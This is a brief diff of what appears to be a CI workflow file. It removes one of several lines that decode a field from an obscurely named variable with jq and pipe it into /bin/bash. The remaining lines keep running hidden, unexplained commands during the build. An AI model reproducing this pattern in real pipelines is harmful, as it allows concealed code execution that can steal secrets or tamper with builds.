@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$wrv1" | jq -r .vq168 | /bin/bash
           echo $yy104 | jq -r .q658 | /bin/bash
           echo $dhe805 | jq -r .bwsqn5353 | /bin/bash
-          echo $eojo5494 | jq -r .mwv68 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
